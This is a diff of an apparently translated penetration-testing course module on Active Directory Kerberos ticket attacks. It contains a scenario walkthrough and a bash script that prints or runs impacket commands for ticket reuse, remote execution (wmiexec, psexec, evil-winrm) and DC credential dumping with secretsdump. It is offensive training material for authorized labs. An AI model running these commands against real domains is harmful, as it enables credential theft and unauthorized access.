@@ -4,60 +4,60 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 
 # 12 · AD Attacks: Tickets, Delegation, LAPS, Trust and ADCS (Scenarios 47, 49–55)
 
-> Front: press [00-environment-and-infra](/modules/00-environment-and-infra) Set up the attack machine directory, monitoring and delivery. unified placeholder `LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD URL`。
+> **Prerequisites:** follow [00-environment-and-infra](/modules/00-environment-and-infra) to set up the attack machine directory, listeners and delivery. Shared placeholders: `LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD URL`.
 >
-> The teaching materials are based on cheat sheet（，Hereinafter referred to as CS）Correspondence: scene 47←C5/Textbook§19.3；49←C1；50←C1/Textbook21、23 chapter；51←C5/Textbook21、23 chapter；52←Textbook21、23 chapter；53←C5/Textbook21 chapter；54←Textbook§22.2.1；55←Textbook§22.2.2。CS big festival：`AD Enumeration`(≈L7768)、`AD Attacking`(≈L8251，Contains Unconstrained Delegation L8253 / Golden Tickets L8394 / LAPS L8460)、`Kerberos`(≈L7071)。
+> Textbook basis and cheat sheet mapping (hereafter CS): scenario 47 <- C5/textbook §19.3; 49 <- C1; 50 <- C1/textbook ch. 21, 23; 51 <- C5/textbook ch. 21, 23; 52 <- textbook ch. 21, 23; 53 <- C5/textbook ch. 21; 54 <- textbook §22.2.1; 55 <- textbook §22.2.2. CS sections: `AD Enumeration` (~L7768), `AD Attacking` (~L8251, containing Unconstrained Delegation L8253 / Golden Tickets L8394 / LAPS L8460), `Kerberos` (~L7071).
 
-**Principle of penetration**: 80% of the work of this module occurs on the attack machine Kali (impacket suite + certipy), only "inducing authentication/ticket capture" must be completed on the target Windows host side. First write clearly "where the bill comes from, which service it is going to, and in whose identity" before proceeding - if the bill is in the wrong direction, it will be useless no matter how correct the order is.
+**Cross-cutting principle**: 80% of this module's work happens on the Kali attack machine (impacket suite + certipy); only "inducing authentication / capturing tickets" has to happen on the target Windows host. Write down "where the ticket comes from, which service it is for, and whose identity it carries" before you touch anything - if the ticket points the wrong way, a perfect command is still useless.
 
-| scene | one sentence goal | Scripts used |
+| Scenario | One-line goal | Scripts used |
 |---|---|---|
-| 47 | Linux Hold a ticket → Windows Serve | `m12-kerberos-tickets-linux.sh` |
-| 49 | read LAPS → Executed by local administrator | `m12-ad-enum-windows.ps1` / `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
-| 50 | Unconstrained delegation DC TGT → DCSync | `m12-delegation-attacks.ps1` |
-| 51 | RBCD：Write `AllowedToAct` → Impersonate administrator | `m12-delegation-attacks.ps1` |
-| 52 | constrained delegation S4U → Target SPN Serve | `m12-delegation-attacks.ps1` |
-| 53 | subdomain → Lingen (trust judgment + Extra SID） | `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
-| 54 | ESC1 template → Certificate authentication | `m12-adcs-esc1-esc8.sh` |
-| 55 | ESC8 HTTP Register relay | `m12-adcs-esc1-esc8.sh` |
+| 47 | Linux holds a ticket -> Windows service | `m12-kerberos-tickets-linux.sh` |
+| 49 | Read LAPS -> execute as local administrator | `m12-ad-enum-windows.ps1` / `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
+| 50 | Unconstrained delegation captures a DC TGT -> DCSync | `m12-delegation-attacks.ps1` |
+| 51 | RBCD: write `AllowedToAct` -> impersonate an administrator | `m12-delegation-attacks.ps1` |
+| 52 | Constrained delegation S4U -> target SPN service | `m12-delegation-attacks.ps1` |
+| 53 | Subdomain -> forest root (trust check + Extra SID) | `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
+| 54 | ESC1 template -> certificate authentication | `m12-adcs-esc1-esc8.sh` |
+| 55 | ESC8 HTTP enrollment relay | `m12-adcs-esc1-esc8.sh` |
 
 ---
 
-## Scenario 47: You already have a domain ticket on Linux, but you need to access the Windows service
+## Scenario 47: You already have a domain ticket on Linux, but you need to reach a Windows service
 
-**Situation**: A domain-joined Linux has been controlled, with a valid and accessible credential cache (ccache) or keytab; the next hop is a service (SMB/WinRM/HTTP) in the Windows domain, and there is no clear text password.
+**Situation**: You control a domain-joined Linux host with a valid, usable credential cache (ccache) or keytab; the next hop is a service in the Windows domain (SMB/WinRM/HTTP), and you have no cleartext password.
 
-**Assumptions**: The deviation between Linux time and DC is <5 minutes (Kerberos hard requirement, check with `date` first); the attack machine can directly connect to DC's TCP/UDP 88 and the target's 445/5985; known `DOMAIN` (including FQDN case) and DC host name/IP. Note: Key distribution must use **domain name in all lowercase**, and the target must be accessed using **FQDN** consistent with SPN (IP cannot be used).
+**Assumptions**: The Linux clock is within 5 minutes of the DC (hard Kerberos requirement - compare with `date` first); the attack machine can reach TCP/UDP 88 on the DC and 445/5985 on the target; you know `DOMAIN` (FQDN, correct case) plus the DC hostname/IP. Note: key distribution must use the **all-lowercase domain name**, and the target must be reached by the **FQDN that matches the SPN** (never by IP).
 
-**Prepare (attacker)**：
+**Prepare (attacker side)**:
 ```bash
-export KRB5CCNAME=/home/kali/osep/tickets/current.ccache   # Session level, all -k tools read it
-klist -e          # Check whose ticket and encryption type are in the cache（rc4/aes decide whether it can be DC accept）
-# kirbi(Rubeus)→ccache conversion; keytab→kinit see m12-kerberos-tickets-linux.sh
+export KRB5CCNAME=/home/kali/osep/tickets/current.ccache   # session-level; every -k tool reads it
+klist -e          # show whose ticket is in the cache and its enctype (rc4/aes decides whether the DC accepts it)
+# kirbi (Rubeus) -> ccache conversion; keytab -> kinit is in m12-kerberos-tickets-linux.sh
 ```
-`/etc/krb5.conf` Minimal template with `/etc/hosts`（`DC01.corp.local`、`TARGET` of FQDN Both must be parsable) see `m12-kerberos-tickets-linux.sh`。
+The minimal `/etc/krb5.conf` template plus `/etc/hosts` (`DC01.corp.local` and the `TARGET` FQDN must both resolve) are in `m12-kerberos-tickets-linux.sh`.
 
-**Procedure**：
+**Procedure**:
 ```bash
-# 1) Direct authentication with TGT/TGS (-k reads KRB5CCNAME, -no-pass no longer requires a password)
+# 1) Authenticate directly with the TGT/TGS (-k reads KRB5CCNAME, -no-pass stops asking for a password)
 smbclient -k -L //WS02.corp.local
-impacket-wmiexec -k -no-pass DOMAIN/USER@WS02.corp.local     # need cifs/WS02 of TGS，Tool automatic application
-impacket-secretsdump -k -no-pass DC01.corp.local             # need DC Machine ticket, first confirm who is on the ticket
-evil-winrm -i ws02.corp.local -k                             # Walk Kerberos need wsman/WS02
-# 2) The ticket identity has no access rights to the target service → use the existing ticket to request the TGS of other services
-#    (The key is in the cache and there is no need to enter the password; see the script ask_tgs function for details)
+impacket-wmiexec -k -no-pass DOMAIN/USER@WS02.corp.local     # needs the cifs/WS02 TGS; the tool requests it automatically
+impacket-secretsdump -k -no-pass DC01.corp.local             # needs the DC machine ticket; first confirm whose it is
+evil-winrm -i ws02.corp.local -k                             # the Kerberos path needs wsman/WS02
+# 2) The ticket's identity has no access to the target service -> use the existing ticket to request another service's TGS
+#    (the key only has to be in the cache; no password needed again. See the ask_tgs function in the script)
 ```
-**Scripts used**: `m12-kerberos-tickets-linux.sh` (ccache/keytab usage, format conversion, krb5.conf template, TGS required by service).
+**Scripts used**: `m12-kerberos-tickets-linux.sh` (ccache/keytab use, format conversion, krb5.conf template, requesting a TGS per service).
 
-**Validation**: `smbclient -k -L //WS02` can list the shares / `wmiexec` is passed when exiting the shell; `klist` can see the new TGS. If `KRB_AP_ERR_MODIFIED` is reported, it is mostly because the bill subject does not match the SPN/encryption type, and it is not a network problem.
+**Validation**: `smbclient -k -L //WS02` lists shares / `wmiexec` returns a shell = pass; `klist` shows the newly issued TGS. If you get `KRB_AP_ERR_MODIFIED`, it is usually a mismatch between the ticket principal and the SPN or enctype, not a network problem.
 
-**Failure branches and alternatives**：
-- There is a ticket in the cache but the target cannot be accessed → ① Check target FQDN whether with SPN consistent（`smbclient -k -L //WS02` Change `//ws02.corp.local`）；② Is your ticket subject covered by this service? ACL reject → Change service（WinRM Just don’t open it SMB）。
-- KDC Report encryption type is not supported → `/etc/krb5.conf` facing `default_tkt_enctypes/default_tgs_enctypes` join in `rc4-hmac` or supplement `aes256-cts-hmac-sha1-96`，and DC Support set alignment。
-- time offset error（`Clock skew too great`）→ `sudo ntpdate DC01` or manual calibration, the deviation must be <5 minute。
-- Access the intranet across network segments Windows Service (the target is only reachable on the intranet segment)）→ Do port forwarding first/Ligolo（[08-pivoting-tunneling](/modules/08-pivoting-tunneling)），**After forwarding Kerberos**，Note that the machines on the forwarding path must also be reachable. DC:88。
+**Failure branches and alternatives**:
+- There is a ticket in the cache but the target is unreachable -> (1) check that the target FQDN matches the SPN (`smbclient -k -L //WS02` vs `//ws02.corp.local`); (2) your ticket principal may be denied by that service's ACL -> switch service (if WinRM is closed, use SMB).
+- The KDC reports an unsupported enctype -> in `/etc/krb5.conf`, add `rc4-hmac` to `default_tkt_enctypes/default_tgs_enctypes`, or add `aes256-cts-hmac-sha1-96`, so the list matches what the DC supports.
+- Clock skew error (`Clock skew too great`) -> `sudo ntpdate DC01` or fix the clock manually; the skew must stay under 5 minutes.
+- The Windows service sits on an internal segment (target only reachable from inside) -> set up port forwarding/Ligolo first ([08-pivoting-tunneling](/modules/08-pivoting-tunneling)), **do Kerberos after the tunnel is up**, and remember that every machine on the forwarding path must also reach the DC on port 88.
 
-**Exam / OPSEC notes**: Use harmless actions to verify ticket identity first (`smbclient -L`) and then use execution tools; ccache files are stored separately by session (`~/osep/tickets/`) to prevent domain A notes from being used as domain B; all `-k` tools eat `KRB5CCNAME`, and switching notes must be done explicitly `export` and before the command `klist` Confirm.
+**Exam / OPSEC notes**: Verify the ticket identity with something harmless first (`smbclient -L`) before reaching for execution tools; store ccache files per session (`~/osep/tickets/`) so a domain A ticket is never used against domain B; every `-k` tool reads `KRB5CCNAME`, so switching tickets requires an explicit `export`, and confirm with `klist` right before the command.
 
 ---
 
@@ -66,89 +66,89 @@ evil-winrm -i ws02.corp.local -k                             # Walk Kerberos nee
 ````bash
 #!/usr/bin/env bash
 # =============================================================================
-# Purpose: Linux side Kerberos ticket workbench - starting from "existing ccache / keytab / kirbi",
-#       Do bill viewing, format conversion, TGT/TGS application, and use -k to run Windows services
-#       （smbclient / wmiexec / psexec / smbexec / secretsdump / evil-winrm），
-#       Comes with /etc/krb5.conf and the minimal available template for /etc/hosts·resolv.
-# Scenario: M12 Scenario 47 (domain ticket already exists on Linux and needs to access Windows services);
-#       Also serving 50/51/52/53 (how to use the tickets once you get them falls on Windows).
-# Dependencies: krb5-user (klist/kinit/kvno/ktutil, Kali: sudo apt install -y krb5-user);
-#       impacket（impacket-ticketConverter / -getTGT / -getST / -wmiexec / -psexec /
-#       -smbexec / -secretsdump，Kali: sudo apt install -y impacket-scripts）；
+# Purpose: Linux-side Kerberos ticket workbench - start from an existing ccache / keytab / kirbi,
+#       inspect tickets, convert formats, request TGT/TGS, and use -k to hit Windows services
+#       (smbclient / wmiexec / psexec / smbexec / secretsdump / evil-winrm),
+#       plus a minimal working template for /etc/krb5.conf and /etc/hosts·resolv.
+# Scenario: M12 scenario 47 (domain ticket already on Linux, need to reach a Windows service);
+#       also serves 50/51/52/53 (how to use the tickets once you have them to land on Windows).
+# Dependencies: krb5-user (klist / kinit / kvno / ktutil, Kali: sudo apt install -y krb5-user);
+#       impacket (impacket-ticketConverter / -getTGT / -getST / -wmiexec / -psexec /
+#       -smbexec / -secretsdump, Kali: sudo apt install -y impacket-scripts);
 #       smbclient (samba client); evil-winrm (gem install evil-winrm, optional);
-#       When the tool is missing, a clear error will be printed and an installation prompt will be given, and it will not exit silently.
-# Use: ./m12-kerberos-tickets-linux.sh -m info -c ~/osep/tickets/current.ccache
+#       when a tool is missing, print a clear error plus an install hint instead of exiting silently.
+# Usage: ./m12-kerberos-tickets-linux.sh -m info -c ~/osep/tickets/current.ccache
 #       ./m12-kerberos-tickets-linux.sh -m krb5conf -d corp.local -s DC01.corp.local -o /tmp/krb5.conf
 #       ./m12-kerberos-tickets-linux.sh -m convert -T dc.kirbi -o dc.ccache
 #       ./m12-kerberos-tickets-linux.sh -m auth -d corp.local -s DC01.corp.local -t WS02.corp.local
 #       ./m12-kerberos-tickets-linux.sh -m tgs -S cifs/WS02.corp.local -d corp.local
-# Placeholders (all passed in as parameters, no real values ​​are hardcoded in the script):
-#   DOMAIN = domain FQDN (-d, for example corp.local; REALM automatically capitalizes CORP.LOCAL)
-#   TARGET = DC/target host (-s/-t, e.g. DC01.corp.local, WS02.corp.local)
-#   USER/PASS/NTHASH = when password/hash is required (-u/-p/-H)
-#   LHOST = attack machine IP (only used when -i passes the IP of DC/CA, used in hosts template)
-# Test status: Not tested in a real domain environment; local bash -n passed. Execute class mode default print command,
-#           Add -x to actually execute it (to avoid hitting unverified commands directly into the exam environment).
+# Placeholders (all passed in as arguments; no real values are hardcoded in the script):
+#   DOMAIN = domain FQDN (-d, e.g. corp.local; REALM is uppercased automatically to CORP.LOCAL)
+#   TARGET = DC/target host (-s / -t, e.g. DC01.corp.local, WS02.corp.local)
+#   USER / PASS / NTHASH = for cases that need a password/hash (-u / -p / -H)
+#   LHOST = attack machine IP (only used when -i passes the DC/CA IP, for the hosts template)
+# Test status: not exercised against a real domain; local bash -n passes. Execution modes print commands by default;
+#           add -x to actually run them (so unverified commands never hit the exam environment directly).
 # Differences from docs/12-ad-attacks.md:
-#   1) The document classifies kirbi→ccache and keytab→kinit into this script, and splits them into convert / in the implementation.
-#      There are two modes of keytab, the parameters are -T/-o and -k/-u respectively, which are consistent with the behavior described in the document.
-#   2) The document does not mention the specific command of "require TGS by service", here we use tgs mode to complete it (kvno and
-#      impacket-getST two ways), corresponding to the sentence "See the script ask_tgs function" in the document.
-#   3) The cross-domain (subdomain→forest root) step document is placed in scene 53. This script provides cross mode for connection printing.
-#      The golden ticket body command is in m12-laps-and-trust-notes.md.
+#   1) The doc folds kirbi->ccache and keytab->kinit into this script; the implementation splits them into convert /
+#      keytab modes with -T/-o and -k/-u respectively, matching the behaviour described in the doc.
+#   2) The doc does not give a concrete command for requesting a TGS per service; the tgs mode fills that in (kvno and
+#      impacket-getST, two paths), matching the doc line 'see the ask_tgs function in the script'.
+#   3) The cross-domain (subdomain->forest root) steps are documented in scenario 53; this script offers a cross mode
+#      to bridge them, while the golden ticket commands themselves live in m12-laps-and-trust-notes.md.
 # =============================================================================
 set -u
 
 MODE="info"
 DOMAIN=""       # -d  domain FQDN
-DC=""           # -s  DC Host FQDN
-TGT_HOST=""     # -t  Target Windows Host FQDN
+DC=""           # -s  DC host FQDN
+TGT_HOST=""     # -t  target Windows host FQDN
 USER=""         # -u
 PASS=""         # -p
 NTHASH=""       # -H
 CCACHE=""       # -c  ccache path
 KEYTAB=""       # -k  keytab path
-TICKET=""       # -T  Notes to be converted（kirbi / ccache）
+TICKET=""       # -T  ticket to convert (kirbi / ccache)
 OUTFILE=""      # -o  output file
-SPN=""          # -S  Serve SPN
-DCIP=""         # -i  DC/Target IP（only hosts For templates）
-EXEC=0          # -x  Real execution (default only prints）
+SPN=""          # -S  service SPN
+DCIP=""         # -i  DC/target IP (hosts template only)
+EXEC=0          # -x  actually execute (default: print only)
 TICKET_DIR="$HOME/osep/tickets"
 
 usage() {
     sed -n '2,32p' "$0" | sed 's/^# \{0,1\}//'
     cat <<'EOF'
 
-parameter：
-  -m <mode>   Job mode (default info）：
-       info      View current KRB5CCNAME and bill contents（klist -e）+ Time deviation self-test
-       krb5conf  Generate minimum /etc/krb5.conf template（-o Specify the path to write out. By default, it only prints.）
-       hosts     generate /etc/hosts and resolv parsing template（Kerberos The ____ does not work IP access）
-       kinit     Use plain text password to get TGT（kinit USER@REALM）
-       keytab    ktutil make keytab and use it kinit（need -u and -p）
-       convert   kirbi <-> ccache transfer（impacket-ticketConverter，need -T and -o）
-       tgt       Use password/Hash TGT（impacket-getTGT，need -u and -p or -H）
-       tgs       Apply by service TGS（kvno；or impacket-getST -spn，need -S）
-       auth      Use existing ticket Windows Serve：smbclient/wmiexec/psexec/smbexec/
-                 secretsdump/evil-winrm full set -k command (requires -d and -t）
-       cross     Linux → Windows of cross-domain (subdomain→Lin Gen) step printing and pre-prompts
-       all       info + krb5conf + hosts + auth（Cold start one-stop service）
-  -d <fqdn>   domain FQDN（DOMAIN），Required for most modes
-  -s <host>   DC Host FQDN（TARGET）
-  -t <host>   Target Windows Host FQDN（TARGET），auth Pattern required
-  -u <user>   username（USER）
-  -p <pass>   clear text password（PASS）
-  -H <hash>   NTHASH（impacket use）
-  -c <path>   ccache path (override KRB5CCNAME）
+Arguments:
+  -m <mode>   job mode (default info):
+       info      show the current KRB5CCNAME and ticket contents (klist -e) + clock-skew self-check
+       krb5conf  generate a minimal /etc/krb5.conf template (-o names the output path; prints by default)
+       hosts     generate resolution templates for /etc/hosts and resolv (Kerberos cannot use IP)
+       kinit     get a TGT with a cleartext password (kinit USER@REALM)
+       keytab    build a keytab with ktutil and kinit with it (needs -u and -p)
+       convert   kirbi <-> ccache conversion (impacket-ticketConverter, needs -T and -o)
+       tgt       get a TGT with a password/hash (impacket-getTGT, needs -u and -p or -H)
+       tgs       request a TGS per service (kvno; or impacket-getST -spn, needs -S)
+       auth      hit Windows services with an existing ticket: the full smbclient/wmiexec/psexec/smbexec/
+                 secretsdump/evil-winrm -k command set (needs -d and -t)
+       cross     print the Linux -> Windows cross-domain (subdomain->forest root) steps and prerequisites
+       all       info + krb5conf + hosts + auth (cold-start one-shot)
+  -d <fqdn>   domain FQDN (DOMAIN), required for most modes
+  -s <host>   DC host FQDN (TARGET)
+  -t <host>   target Windows host FQDN (TARGET), required for auth mode
+  -u <user>   username (USER)
+  -p <pass>   cleartext password (PASS)
+  -H <hash>   NTHASH (used by impacket)
+  -c <path>   ccache path (overrides KRB5CCNAME)
   -k <path>   keytab path
-  -T <path>   Bill file to be converted（.kirbi / .ccache）
-  -o <path>   output file（krb5conf / keytab / convert / tgt use）
-  -S <spn>    Serve SPN，like cifs/WS02.corp.local（tgs model）
-  -i <ip>     DC or target IP（LHOST Written in the same network segment, only hosts Template used）
-  -x          Really execute the command (default only prints, check first and then execute)）
-  -h          This help
+  -T <path>   ticket file to convert (.kirbi / .ccache)
+  -o <path>   output file (for krb5conf / keytab / convert / tgt)
+  -S <spn>    service SPN, e.g. cifs/WS02.corp.local (tgs mode)
+  -i <ip>     IP of the DC or target (LHOST same-subnet form; only the hosts template uses it)
+  -x          actually execute commands (default is print only - check before you run)
+  -h          this help
 
-exit code：0 normal / 1 Parameter or dependency error
+exit codes: 0 ok / 1 argument or dependency error
 EOF
     exit 0
 }
@@ -158,7 +158,7 @@ info() { printf '[*] %s\n' "$*"; }
 head_() { printf '\n===== %s =====\n' "$*"; }
 have() { command -v "$1" >/dev/null 2>&1; }
 
-# Print command line: Only add single quotes to parameters containing spaces/quotes to ensure that the output can be directly copied and executed.
+# Print a command line: single-quote only the arguments containing spaces/quotes so the output is copy-pasteable
 printable() {
     local out="" a
     for a in "$@"; do
@@ -170,7 +170,7 @@ printable() {
     printf '%s\n' "${out# }"
 }
 
-# Print (or execute) a command: print first, then execute at -x; missing commands give readable prompts
+# Print (or execute) one command: print first, then run it when -x is set; a missing command gives a readable hint
 run() {
     printable "$@"
     if [ "$EXEC" != "1" ]; then return 0; fi
@@ -178,7 +178,7 @@ run() {
         err "Missing command: $1 (Kali: sudo apt install -y krb5-user impacket-scripts samba-client)"
         return 0
     fi
-    "$@" || err "The previous command returned non-zero: troubleshoot according to the above output (ticket body/SPN/encryption type/time)"
+    "$@" || err "The previous command returned non-zero: work through the output above (ticket principal/SPN/enctype/time)"
     return 0
 }
 
@@ -203,13 +203,13 @@ while getopts "m:d:s:t:u:p:H:c:k:T:o:S:i:xh" opt; do
     esac
 done
 
-# REALM is always capitalized (Kerberos requirement)
+# REALM is always uppercase (Kerberos requirement)
 REALM=""
 if [ -n "$DOMAIN" ]; then
     REALM="$(printf '%s' "$DOMAIN" | tr '[:lower:]' '[:upper:]')"
 fi
 
-# ccache defaults and exports: all -k tools read KRB5CCNAME
+# ccache default and export: every -k tool reads KRB5CCNAME
 if [ -n "$CCACHE" ]; then
     KRB5CCNAME="$CCACHE"
     export KRB5CCNAME
@@ -235,49 +235,49 @@ require_mode_arg() {
         shift
     done
     if [ -n "$missing" ]; then
-        err "Mode -m $MODE missing required argument: $missing"
-        err "(Use -h to view the parameters required for each mode)"
+        err "Mode -m $MODE is missing required arguments: $missing"
+        err "(use -h to see which arguments each mode needs)"
         exit 1
     fi
 }
 
 # ---------------------------------------------------------------------------
 mode_info() {
-    head_ "Ticket and session self-test (info)"
-    info "KRB5CCNAME = ${KRB5CCNAME:- (not set, the tool will fall back to /tmp/krb5cc_UID)}"
+    head_ "Ticket and session self-check (info)"
+    info "KRB5CCNAME = ${KRB5CCNAME:-(not set; tools fall back to /tmp/krb5cc_UID)}"
     info "Session-level export: export KRB5CCNAME=$CCACHE"
     if [ ! -f "$CCACHE" ]; then
-        err "The ccache file does not exist: ${CCACHE} (use convert/tgt/kinit mode to output first, or -c to specify the correct path)"
+        err "ccache file does not exist: ${CCACHE} (produce one with convert/tgt/kinit first, or point -c at the right path)"
     fi
     run klist -e
     echo
-    info "Time drift check (Kerberos requires <5 minutes from DC):"
+    info "Clock-skew check (Kerberos requires <5 minutes from the DC):"
     run date
     if [ -n "$DC" ]; then
-        info "Check DC time: nc -vz $DC 445 to continue; calibration: sudo ntpdate $DC"
-        info "(When ntpdate is not available: sudo rdate -n $DC or date -s 'YYYY-MM-DD HH:MM:SS')"
+        info "Compare DC time: nc -vz $DC 445 must succeed before you continue; fix with: sudo ntpdate $DC"
+        info "(if ntpdate is unavailable: sudo rdate -n $DC or date -s 'YYYY-MM-DD HH:MM:SS')"
     else
-        info "After giving -s DC01.corp.local, you can print the time comparison and calibration command with DC"
+        info "Pass -s DC01.corp.local to also print the DC time comparison and the correction command"
     fi
     echo
-    info "Common judgments:"
-    info "· The Default principal in klist determines "who you are" and determines which services can be accessed"
-    info "· Most DCs accept etype rc4-hmac / aes256-cts-hmac-sha1-96"
-    info "· KRB_AP_ERR_MODIFIED mostly means that the ticket body does not match the SPN or encryption type, and is not a network problem."
-    info "· Clock skew too great means the time is off, correct the time first and try again"
+    info "Common readings:"
+    info "  - Default principal in klist decides who you are, and therefore which services you can reach"
+    info "  - etypes rc4-hmac / aes256-cts-hmac-sha1-96 are accepted by most DCs"
+    info "  - KRB_AP_ERR_MODIFIED usually means the ticket principal does not match the SPN or enctype, not a network fault"
+    info "  - Clock skew too great means the clock drifted; fix the time and retry"
 }
 
 # ---------------------------------------------------------------------------
 mode_krb5conf() {
     require_mode_arg DOMAIN DC
-    head_ "/etc/krb5.conf minimal template (krb5conf)"
+    head_ "Minimal /etc/krb5.conf template (krb5conf)"
     local conf
     conf="$(cat <<EOF
 [libdefaults]
     default_realm = $REALM
     dns_lookup_kdc = false
     dns_lookup_realm = false
-    # Aligned with the DC support set: the old environment only uses rc4-hmac, and the new environment commonly uses aes256
+    # Match the DC's supported set: old environments only accept rc4-hmac, new ones commonly use aes256
     default_tkt_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
     default_tgs_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
     permitted_enctypes  = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
@@ -304,54 +304,54 @@ EOF
     printf '%s\n' "$conf"
     if [ -n "$OUTFILE" ]; then
         printf '%s\n' "$conf" > "$OUTFILE" \
-            && info "Written out: ${OUTFILE} (effective: sudo cp $OUTFILE /etc/krb5.conf)" \
-            || err "Failed to write: ${OUTFILE} (read-only? Replace -o /tmp/krb5.conf)"
+            && info "Written: ${OUTFILE} (activate with: sudo cp $OUTFILE /etc/krb5.conf)" \
+            || err "Write failed: ${OUTFILE} (read-only? try -o /tmp/krb5.conf)"
     else
-        info "To download: add -o /tmp/krb5.conf and then sudo cp /tmp/krb5.conf /etc/krb5.conf"
+        info "To persist: add -o /tmp/krb5.conf then sudo cp /tmp/krb5.conf /etc/krb5.conf"
         info "Back up before copying: sudo cp /etc/krb5.conf /etc/krb5.conf.bak"
     fi
     echo
-    info "When an encryption type error is reported (KDC has no support for encryption type): Delete the unnecessary etype to"
-    info "Only rc4-hmac is left and try again; or add aes256-cts-hmac-sha1-96 in reverse."
+    info "On an enctype error (KDC has no support for encryption type): trim the unneeded etypes down to"
+    info "rc4-hmac only and retry; or go the other way and add aes256-cts-hmac-sha1-96."
 }
 
 # ---------------------------------------------------------------------------
 mode_hosts() {
     require_mode_arg DOMAIN DC
-    head_ "Name resolution template (hosts) - Kerberos must use FQDN and cannot use IP direct connection"
+    head_ "Name resolution template (hosts) - Kerberos requires FQDNs, never a direct IP"
     local ip1="$DCIP"
     [ -z "$ip1" ] && ip1="TARGET"
-    echo "# /etc/hosts Append (IP replaces TARGET with real value; FQDN must be consistent with the writing in SPN)"
+    echo "# append to /etc/hosts (replace TARGET with the real IP; the FQDN must be spelled exactly as in the SPN)"
     echo "$ip1    $DC    ${DC%%.*}"
     if [ -n "$TGT_HOST" ]; then
         echo "TARGET    $TGT_HOST    ${TGT_HOST%%.*}"
     fi
     echo
-    echo "#Append method (requires root)"
+    echo "# how to append (needs root)"
     echo "sudo sh -c 'echo \"$ip1    $DC    ${DC%%.*}\" >> /etc/hosts'"
     if [ -n "$TGT_HOST" ]; then
         echo "sudo sh -c 'echo \"TARGET    $TGT_HOST    ${TGT_HOST%%.*}\" >> /etc/hosts'"
     fi
     echo
-    info "When using domain DNS instead of hosts (cleaner):"
-    echo "sudo sh -c 'echo \"nameserver TARGET\"> /etc/resolv.conf' # First replace TARGET with the IP of the DC"
-    echo "# Or temporary: dig @TARGET $DC +short to verify whether the parsing returns the correct IP"
+    info "Using the domain DNS instead of hosts (cleaner):"
+    echo "sudo sh -c 'echo \"nameserver TARGET\" > /etc/resolv.conf'   # replace TARGET with the DC's IP first"
+    echo "# or ad hoc: dig @TARGET $DC +short  to verify the lookup returns the right IP"
     echo
-    info "Verification: getent hosts $DC should return IP; ping failure will not affect it, as long as the resolution pair + 88/445 is reachable"
-    info "Note: FQDN and short name must be written in /etc/hosts at the same time, otherwise some tools cannot spell out SPN."
+    info "Verify: getent hosts $DC should return an IP; ping failing does not matter as long as resolution is right and 88/445 are reachable"
+    info "Note: /etc/hosts must carry both the FQDN and the short name, otherwise some tools cannot build the SPN"
 }
 
 # ---------------------------------------------------------------------------
 mode_kinit() {
     require_mode_arg DOMAIN USER PASS
-    head_ "Get TGT (kinit) with clear text password"
-    info "REALM must be capitalized: $REALM"
+    head_ "Get a TGT with a cleartext password (kinit)"
+    info "REALM must be uppercase: $REALM"
     run kinit "$USER@$REALM"
     echo
-    info "Tip: Paste PASS when prompted for password; or (experimental environment only) printf 'PASS' | kinit $USER@$REALM"
+    info "Tip: paste PASS at the password prompt; or (lab only) printf 'PASS' | kinit $USER@$REALM"
     run klist -e
     echo
-    info "Renewal: kinit -R (the bill is still within the renew period)"
+    info "Renew: kinit -R (while the ticket is still inside its renew window)"
 }
 
 # ---------------------------------------------------------------------------
@@ -359,8 +359,8 @@ mode_keytab() {
     require_mode_arg DOMAIN USER PASS
     local kt="$OUTFILE"
     [ -z "$kt" ] && kt="$TICKET_DIR/$USER.keytab"
-    head_ "keytab ticket creation (keytab) -> $kt"
-    echo "# ktutil interactive steps (equivalent non-interactive see below)"
+    head_ "Mint a ticket from a keytab (keytab) -> $kt"
+    echo "# ktutil interactive steps (non-interactive equivalent below)"
     echo "ktutil"
     echo "  addent -password -p $USER@$REALM -k 1 -e rc4-hmac"
     echo "  wkt $kt"
@@ -369,12 +369,12 @@ mode_keytab() {
     echo "kinit $USER@$REALM -k -t $kt"
     echo "klist -e"
     echo
-    info "Non-interactive writing method (use printf in the script to feed ktutil):"
+    info "Non-interactive form (the script feeds printf into ktutil):"
     echo "printf 'addent -password -p %s@%s -k 1 -e rc4-hmac\\n%s\\nwkt %s\\nquit\\n' \\" "$USER" "$REALM" "PASS" "$kt"
     echo "  | ktutil"
     echo
-    info "The -e of ktutil must be consistent with the encryption type supported by DC; rc4-hmac has the best compatibility."
-    info "After creating the keytab, remember: kinit to generate ccache before exporting KRB5CCNAME=$CCACHE."
+    info "ktutil's -e must match an enctype the DC supports; rc4-hmac has the best compatibility."
+    info "After building the keytab remember: kinit to produce the ccache before export KRB5CCNAME=$CCACHE."
     mkdir -p "$TICKET_DIR" 2>/dev/null || true
 }
 
@@ -390,53 +390,53 @@ mode_convert() {
             run impacket-ticketConverter "$TICKET" "$out"
             ;;
         *.ccache)
-            info "ccache -> kirbi (for Windows side Rubeus/mimikatz ptt)"
+            info "ccache -> kirbi (for Windows-side Rubeus / mimikatz ptt)"
             run impacket-ticketConverter "$TICKET" "$out"
             ;;
         *.txt|*.b64)
-            info "base64 TGT text (Rubeus monitor output) -> save to file first and then transfer:"
+            info "base64 TGT text (Rubeus monitor output) -> save it to a file first, then convert:"
             echo "base64 -d $TICKET > ${TICKET%.*}.kirbi"
             run impacket-ticketConverter "${TICKET%.*}.kirbi" "$out"
             ;;
         *)
-            err "Unable to determine ticket type from extension: ${TICKET} (supports .kirbi / .ccache / .txt)"
-            err "Explicitly specify output to -o, the script is still processed by impacket-ticketConverter"
+            err "Cannot tell the ticket type from the extension: ${TICKET} (supported: .kirbi / .ccache / .txt)"
+            err "Pass -o to name the output explicitly; the script still goes through impacket-ticketConverter"
             run impacket-ticketConverter "$TICKET" "$out"
             ;;
     esac
     echo
-    info "After conversion: export KRB5CCNAME=$out and then klist -e to confirm the body (such as DC01\$)"
